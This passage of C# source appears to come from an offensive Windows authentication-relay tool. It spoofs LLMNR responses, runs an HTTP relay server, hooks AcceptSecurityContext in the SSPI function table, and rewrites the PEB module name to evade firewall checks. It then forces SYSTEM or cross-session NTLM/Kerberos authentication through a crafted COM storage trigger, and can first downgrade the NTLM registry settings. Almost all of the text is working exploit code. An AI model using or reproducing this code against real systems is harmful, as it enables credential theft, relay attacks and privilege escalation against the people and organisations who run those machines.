                if (string.IsNullOrEmpty(argSpooferIP))
                {
                    argSpooferIP = Spoofing.Util.GetLocalIPAddress("IPv4");
                }
                if (string.IsNullOrEmpty(argSpooferIPv6))
                {
                    argSpooferIPv6 = Spoofing.Util.GetLocalIPAddress("IPv6");
                }
                string spoofSPN = "";
                //if (service == "cifs")
                //    spoofSPN = targetFQDN.Split('.')[0];
                //else
                //    spoofSPN = targetFQDN;
                spoofSPN = targetFQDN.Split('.')[0];

                Thread llmnrListenerThread = new Thread(() => Spoofing.LLMNR.LLMNRListener(argSpooferIP, argSpooferIP, argSpooferIPv6, argLLMNRTTL, "IPv4", spoofSPN));
                llmnrListenerThread.Start();

                //http
                Spoofing.HttpRelayServer.start(service, argSpooferIP);
                //Thread httpRelayServerThread = new Thread(() => Spoofing.HttpRelayServer.start(targetFQDN, useSSL, service));
                //httpRelayServerThread.Start();

                return;
            }

            //get value for AcceptSecurityContex
            Console.WriteLine("[*] Rewriting function table");
            IntPtr functionTable = InitSecurityInterface();
            //Console.WriteLine("[*] functionTable: {0}", functionTable);
            SecurityFunctionTable table = (SecurityFunctionTable)Marshal.PtrToStructure(functionTable, typeof(SecurityFunctionTable));
            //Console.WriteLine("[*] Old AcceptSecurityContex: {0}", table.AcceptSecurityContex);

            //overwrite AcceptSecurityContex
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, Process.GetCurrentProcess().Id);
            AcceptSecurityContextFunc AcceptSecurityContextDeleg;
            if (ntlm == true)
            {
                AcceptSecurityContextDeleg = new AcceptSecurityContextFunc(AcceptSecurityContext_ntlm);
            }
            else
            {
                AcceptSecurityContextDeleg = new AcceptSecurityContextFunc(AcceptSecurityContext_kerb);
            }
            byte[] bAcceptSecurityContext = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(AcceptSecurityContextDeleg).ToInt64());
            int oAcceptSecurityContext = Helpers.FieldOffset<SecurityFunctionTable>("AcceptSecurityContex");
            Marshal.Copy(bAcceptSecurityContext, 0, (IntPtr)functionTable + oAcceptSecurityContext, bAcceptSecurityContext.Length);
            //get new value
            table = (SecurityFunctionTable)Marshal.PtrToStructure(functionTable, typeof(SecurityFunctionTable));
            //Console.WriteLine("[*] New AcceptSecurityContex: {0}", table.AcceptSecurityContex);

            //Console.WriteLine();
            Console.WriteLine("[*] Rewriting PEB");
            //Init RPC server
            int dwAuthnSvc = 16;
            string pPrincipalName = spn;
            if (ntlm == true)
            {
                dwAuthnSvc = 10;
                pPrincipalName = null;
            }
            var svcs = new SOLE_AUTHENTICATION_SERVICE[] {
                new SOLE_AUTHENTICATION_SERVICE() {
                    dwAuthnSvc = dwAuthnSvc, // HKLM\SOFTWARE\Microsoft\Rpc\SecurityService sspicli.dll
                    pPrincipalName = pPrincipalName
                }
            };
            //bypass firewall restriction by overwriting checks on PEB
            string str = SetProcessModuleName("System");
            StringBuilder fileName = new StringBuilder(1024);
            GetModuleFileName(IntPtr.Zero, fileName, fileName.Capacity);
            Console.WriteLine("[*] GetModuleFileName: {0}", fileName);
            try
            {
                Console.WriteLine("[*] Init com server");
                CoInitializeSecurity(IntPtr.Zero, svcs.Length, svcs,
                     IntPtr.Zero, AuthnLevel.RPC_C_AUTHN_LEVEL_CONNECT,
                     ImpLevel.RPC_C_IMP_LEVEL_IMPERSONATE, IntPtr.Zero,
                     Natives.EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING,
                     IntPtr.Zero);
            }
            finally
            {
                string str2 = SetProcessModuleName(str);
                fileName.Clear();
                GetModuleFileName(IntPtr.Zero, fileName, fileName.Capacity);
                Console.WriteLine("[*] GetModuleFileName: {0}", fileName);
                //Console.WriteLine();
            }

            //Unable to call other com objects before doing the CoInitializeSecurity step
            //Make sure that we'll use an available port
            if (!checkPort(int.Parse(port)))
            {
                Console.WriteLine("[*] Looking for available ports..");
                port = checkPorts(new string[] { "SYSTEM" }).ToString();
                if (port == "-1")
                {
                    Console.WriteLine("[-] No available ports found");
                    Console.WriteLine("[-] Firwall will block our COM connection. Exiting");
                    return;
                }
                Console.WriteLine("[*] Port {0} available", port);
            }

            //COM object
            Console.WriteLine("[*] Register com server");
            byte[] ba = ComUtils.GetMarshalledObject(new object());
            COMObjRefStandard std = (COMObjRefStandard)COMObjRefStandard.FromArray(ba);
            //Console.WriteLine("[*] IPID: {0}", std.Ipid);
            //Console.WriteLine("[*] OXID: {0:X08}", std.Oxid);
            //Console.WriteLine("[*] OID : {0:X08}", std.Oid);
            std.StringBindings.Clear();
            std.StringBindings.Add(new COMStringBinding(RpcTowerId.Tcp, "127.0.0.1"));
            Console.WriteLine(std.ToMoniker());
            //std.SecurityBindings.Clear();
            //std.SecurityBindings.Add(new COMSecurityBinding(RpcAuthnService.GSS_Kerberos, spn));

            RpcServerUseProtseqEp("ncacn_ip_tcp", 20, port, IntPtr.Zero);
            RpcServerRegisterAuthInfo(null, (uint)dwAuthnSvc, IntPtr.Zero, IntPtr.Zero);

            // Initialized IStorage
            IStorage stg;
            ILockBytes lb;
            int result;
            result = Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);
            result = Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);
            Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];
            //insert our ObjRef(std) in the StorageTrigger
            StorageTrigger storageTrigger = new StorageTrigger(storage, "127.0.0.1", TowerProtocol.EPM_PROTOCOL_TCP, std);
            qis[0].pIID = Ole32.IID_IUnknownPtr;
            qis[0].pItf = null;
            qis[0].hr = 0;

            object oldValue_LMCompatibilityLevel = null;
            object oldValue_NtlmMinClientSec = null;
            object oldValue_RestrictSendingNTLMTraffic = null;
            if (downgrade && ntlm)
            {
                SetDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic);
            }
            try
            {
                if (sessionID == -123)
                {
                    Console.WriteLine();
                    Console.WriteLine("[*] Forcing SYSTEM authentication");
                    Console.WriteLine("[*] Using CLSID: {0}", clsId_guid);
                    try
                    {
                        result = Ole32.CoGetInstanceFromIStorage(null, ref clsId_guid, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
                else
                {
                    Console.WriteLine();
                    Console.WriteLine("[*] Forcing cross-session authentication");
                    Console.WriteLine("[*] Using CLSID: {0}", clsId_guid);

                    Guid tmp = new Guid("{00000000-0000-0000-C000-000000000046}");
                    Guid CLSID_ComActivator = new Guid("{0000033C-0000-0000-c000-000000000046}");
                    Guid IID_IStandardActivator = typeof(IStandardActivator).GUID;
                    var pComAct = (IStandardActivator)new StandardActivator();
                    uint result2 = Ole32.CoCreateInstance(ref CLSID_ComActivator, null, 0x1, ref IID_IStandardActivator, out object instance);
                    pComAct = (IStandardActivator)instance;

                    if (sessionID != -123)
                    {
                        ISpecialSystemPropertiesActivator props = (ISpecialSystemPropertiesActivator)pComAct;
                        Console.WriteLine("[*] Spawning in session {0}", sessionID);
                        props.SetSessionId(sessionID, 0, 1);
                    }
                    try
                    {
                        result = pComAct.StandardGetInstanceFromIStorage(null, clsId_guid, IntPtr.Zero, CLSCTX.LOCAL_SERVER, storageTrigger, 1, qis);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                    //Console.WriteLine("[*] StandardGetInstanceFromIStoragee: {0}", result);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            //Marshal.BindToMoniker(std.ToMoniker());

            if (downgrade && ntlm)
            {
                RestoreDowngrade(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
            }
        }
    }
}